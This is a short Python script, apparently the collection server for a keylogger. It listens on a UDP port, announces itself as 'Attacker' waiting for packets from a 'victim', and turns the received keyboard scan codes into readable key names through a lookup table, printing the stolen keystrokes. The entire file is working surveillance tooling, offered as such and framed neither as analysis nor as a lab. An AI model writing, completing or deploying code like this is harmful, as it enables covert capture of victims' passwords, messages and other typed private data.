import socket
import tkinter as tk

codes = ("", "ESC", '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 
         '-', '=', "BKSP", "TAB", 'q', 'w', 'e', 'r', 't', 'y', 
         'u', 'i', 'o', 'p', '[', ']', "ENTER", "CTRL", 'a', 's', 
         'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', "LSHIFT", 
         '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 
         "RSHIFT", "PRTSCR", "ALT", ' ', "CAPSLOCK", "F1", "F2", 
         "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", 
         "SCRLOCK", "HOME", "UP", "PGUP", '-', "LEFT", '5', "RIGHT", 
         '+', "END", "DOWN", "PGDN", "INSERT", "DELETE", "SH_F1",
         "SH_F2", "SH_F3", "SH_F4", "SH_F5", "SH_F6", "SH_F7", "SH_F8",
         "SH_F9", "SH_F10", "CTRL_F1", "CTRL_F2", "CTRL_F3", "CTRL_F4",
         "CTRL_F5", "CTRL_F6", "CTRL_F7", "CTRL_F8", "CTRL_F9",
         "CTRL_F10", "ALT_F1", "ALT_F2", "ALT_F3", "ALT_F4", "ALT_F5",
         "ALT_F6", "ALT_F7", "ALT_F8", "ALT_F9", "ALT_F10", "CTRL_PRTSCR",
         "CTRL_LEFT", "CTRL_RIGHT", "CTRL_END", "CTRL_PGDN", "ALT1",
         "ALT2", "ALT3", "ALT4", "ALT5", "ALT6", "ALT7", "ALT8", "ALT9",
         "ALT0", "ALT-", "ALT=", "CTRL_PGUP", "F11", "F12", "SH_F11",
         "SH_F12", "CTRL_F11", "CTRL_F12", "ALT_F11", "ALT_F12", "CTRL_UP",
         "CTRL-", "CTRL5", "CTRL+", "CTRL_DOWN", "CTRL_INSERT", 
         "CTRL_DELETE", "CTRL_TAB", "CTRL/", "CTRL*", "ALT_HOME", "ALT_UP",
         "ALT_PGUP", "", "ALT_LEFT", "", "ALT_RIGHT", "", "ALT_END",
         "ALT_DOWN", "ALT_PGDN", "ALT_INSERT", "ALT_DELETE", "ALT/",
         "ALT_TAB", "ALT_ENTER")

def decode_scancodes(string):
    out = ""
    for i in string:
        out += codes[int(i)]
    return out

def main():

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('', 49324))
    
    print("\033[38;5;208mAttacker started. \033[3mWaiting for packets from victim...\033[0m")

    while True:
        message, address = server_socket.recvfrom(256)

        len = int(message[0])
        logs = decode_scancodes(message[1:])
        print(f"\033[38;5;172mReceived: \033[38;5;223m{logs}\033[0m")
    

if __name__ == '__main__':
    main()
